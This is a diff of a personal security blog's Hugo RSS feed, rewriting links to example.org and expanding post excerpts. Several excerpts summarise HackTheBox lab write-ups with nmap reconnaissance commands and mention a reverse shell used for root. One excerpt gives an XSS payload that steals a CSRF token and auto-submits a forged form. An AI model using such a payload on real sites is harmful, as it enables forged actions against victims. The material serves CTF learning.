@@ -1,216 +1,123 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Ajdin Trejić</title>
-    
-    
-    
-    <link>/</link>
-    <description>Recent content on Ajdin Trejić</description>
+    <title>codex</title>
+    <link>https://example.org/</link>
+    <description>Recent content on codex</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
+    <copyright>© {year}</copyright>
     <lastBuildDate>Tue, 18 Aug 2020 00:00:00 +0000</lastBuildDate>
     
-	<atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://example.org/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>HackTheBox Traceback Write Up w/o Metasploit</title>
-      <link>/posts/htb/traceback/</link>
+      <link>https://example.org/posts/htb/traceback/</link>
       <pubDate>Tue, 18 Aug 2020 00:00:00 +0000</pubDate>
       
-      <guid>/posts/htb/traceback/</guid>
-      <description>
-        
-          &lt;img src=&#34;/htb/traceback/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access.
-          
-        
-        </description>
+      <guid>https://example.org/posts/htb/traceback/</guid>
+      <description>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.
+Reconnaissance Let’s run a quick nmap and full nmap scan in background:
+#top 1000 ports sudo nmap -sV -sC -O -oA nmap/initial 10.</description>
     </item>
     
     <item>
       <title>Privacy</title>
-      <link>/privacy/</link>
+      <link>https://example.org/privacy/</link>
       <pubDate>Tue, 18 Aug 2020 00:00:00 +0000</pubDate>
       
-      <guid>/privacy/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          Privacy Policy for ajdin.io
+      <guid>https://example.org/privacy/</guid>
+      <description>Privacy Policy for ajdin.io
 At ajdin.io, accessible from https://ajdin.io, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by ajdin.io and how we use it.
 If you have additional questions or require more information about our Privacy Policy, do not hesitate to contact us.
-General Data Protection Regulation (GDPR) We are a Data Controller of your information.
-          
-        
-        </description>
+General Data Protection Regulation (GDPR) We are a Data Controller of your information.</description>
     </item>
     
     <item>
       <title>Building Worklog: a PERN stack web application</title>
-      <link>/posts/worklog/</link>
+      <link>https://example.org/posts/worklog/</link>
       <pubDate>Sat, 18 Jul 2020 00:00:00 +0000</pubDate>
       
-      <guid>/posts/worklog/</guid>
-      <description>
-        
-          &lt;img src=&#34;/worklog/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          Building a web based application using PostgreSQL for database, ExpressJS for routing and ReactJS for front end. This app is supposed to help medium sized businesses automate the boring work.
-          
-        
-        </description>
+      <guid>https://example.org/posts/worklog/</guid>
+      <description>Introduction I’ll be building a simple web application to log workers&amp;rsquo; activity. I’ll be using PostgresSQL for database, React for front end and Express for routing the app.
+Functionality For user:
+ Log work time, location, job details Calculate pay/wage automatically  For admin:
+ See all current working users See all jobs done by time/category/location etc. Automate the boring stuff  Setting up the environment I’m running Arch Linux, so this part will be Linux specific.</description>
     </item>
     
     <item>
       <title>CV</title>
-      <link>/cv/</link>
+      <link>https://example.org/cv/</link>
       <pubDate>Tue, 19 May 2020 00:00:00 +0000</pubDate>
       
-      <guid>/cv/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          You can download my resume here in English. I might add German and Croatian translations.
- English German Croatian  
-          
-        
-        </description>
+      <guid>https://example.org/cv/</guid>
+      <description>You can download my resume here in English. I might add German and Croatian translations.
+ English German Croatian  </description>
     </item>
     
     <item>
       <title>CSRF Token Extraction</title>
-      <link>/posts/csrf-bypass-token-with-xss/</link>
+      <link>https://example.org/posts/csrf-bypass-token-with-xss/</link>
       <pubDate>Thu, 07 May 2020 00:43:19 +0200</pubDate>
       
-      <guid>/posts/csrf-bypass-token-with-xss/</guid>
-      <description>
-        
-          &lt;img src=&#34;/csrf-bypass-token-with-xss/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          Extracting tokens from victim using XSS for fun.
-          
-        
-        </description>
+      <guid>https://example.org/posts/csrf-bypass-token-with-xss/</guid>
+      <description>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
+&amp;lt;form action=&amp;quot;&amp;lt;url goes here&amp;gt;&amp;quot; method=&amp;quot;post&amp;quot; name=&amp;quot;csrf&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;quot;token&amp;quot; type=&amp;quot;hidden&amp;quot; name=&amp;quot;token&amp;quot; value=&amp;quot;&amp;quot; /&amp;gt; &amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;quot;GET&amp;quot;, &amp;quot;&amp;lt;url goes here&amp;gt;&amp;quot;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&#39;token&#39;).setAttribute(&#39;value&#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt;  What is this token?</description>
     </item>
     
     <item>
       <title>HackTheBox Openadmin Write Up</title>
-      <link>/posts/htb/openadmin/</link>
+      <link>https://example.org/posts/htb/openadmin/</link>
       <pubDate>Sat, 02 May 2020 09:03:27 +0200</pubDate>
       
-      <guid>/posts/htb/openadmin/</guid>
-      <description>
-        
-          &lt;img src=&#34;/htb/openadmin/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          This is a write up on how to gain root on HackTheBox Openadmin
-          
-        
-        </description>
+      <guid>https://example.org/posts/htb/openadmin/</guid>
+      <description>Reconnaissance Let&amp;rsquo;s see what have we got here with nmap.
+nmap -sC -sV -O -oA nmap/initial 10.10.10.171  -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute  Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</description>
     </item>
     
     <item>
       <title>HackTheBox Mango Write Up</title>
-      <link>/posts/htb/mango/</link>
+      <link>https://example.org/posts/htb/mango/</link>
       <pubDate>Sat, 18 Apr 2020 13:28:11 +0200</pubDate>
       
-      <guid>/posts/htb/mango/</guid>
-      <description>
-        
-          &lt;img src=&#34;/htb/mango/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          This is a write up on how to gain root on HackTheBox Mango
-          
-        
-        </description>
+      <guid>https://example.org/posts/htb/mango/</guid>
+      <description>Reconnaissance Let’s run nmap,
+sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162  We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
+Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference: staging-order.</description>
     </item>
     
     <item>
       <title>HackTheBox Postman Write Up</title>
-      <link>/posts/htb/postman/</link>
+      <link>https://example.org/posts/htb/postman/</link>
       <pubDate>Fri, 13 Mar 2020 13:28:11 +0200</pubDate>
       
-      <guid>/posts/htb/postman/</guid>
-      <description>
-        
-          &lt;img src=&#34;/htb/postman/cover.jpg&#34;/&gt;
-          
-        
-        
-        
-          This is a write up on how to gain root on HackTheBox Postman
-          
-        
-        </description>
+      <guid>https://example.org/posts/htb/postman/</guid>
+      <description>Reconnaissance Let’s run a quick nmap scan as always.
+# nmap -sV -sC -O -oA nmap/initial 10.10.10.160  Short explanation:
+-sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats  For a more detailed explanation click here.
+While I wait for this to be finished I’ll start a full nmap scan.
+# nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160  As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</description>
     </item>
     
     <item>
       <title>About</title>
-      <link>/about/</link>
+      <link>https://example.org/about/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/about/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          I’m a computer science student @ UniZg. I’m interested in development and security of modern web applications. I have created this website to take notes when I see fit.
-You can find me here:  Twitter: @ajdintrejic Discord: nsf#7437 Mail: ajdintrejic[at]protonmail[dot]ch  Credits  Site built with Hugo Theme is modified Hello Friend  
-          
-        
-        </description>
+      <guid>https://example.org/about/</guid>
+      <description>I’m a computer science student @ UniZg. I’m interested in development and security of modern web applications. I have created this website to take notes when I see fit.
+You can find me here:  Twitter: @ajdintrejic Discord: nsf#7437 Mail: ajdintrejic[at]protonmail[dot]ch  Credits  Site built with Hugo Theme is modified Hello Friend  </description>
     </item>
     
     <item>
       <title>Archive</title>
-      <link>/archive/</link>
+      <link>https://example.org/archive/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/archive/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          
-          
-        
-        </description>
+      <guid>https://example.org/archive/</guid>
+      <description></description>
     </item>
     
   </channel>
